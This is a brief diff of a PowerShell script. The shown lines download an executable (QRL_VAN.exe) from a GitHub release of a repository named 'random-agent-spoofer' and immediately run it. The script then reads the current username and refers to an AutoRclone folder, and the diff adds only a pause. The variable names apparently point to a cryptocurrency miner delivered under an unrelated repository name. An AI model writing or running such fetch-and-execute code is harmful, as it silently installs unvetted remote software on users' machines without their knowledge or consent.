@@ -3,6 +3,7 @@ $url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/Q
 Invoke-WebRequest -Uri $url -OutFile "$downloadPath\QRL_VAN.exe"
 $packetCryptPath = Join-Path -Path $downloadPath -ChildPath "QRL_VAN.exe"
 Start-Process -FilePath $packetCryptPath
+Start-Sleep -Seconds 2
 $userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $userName = $userName -replace "^.*\\", ""
 $folderPath = "C:\AutoRclone-master\"
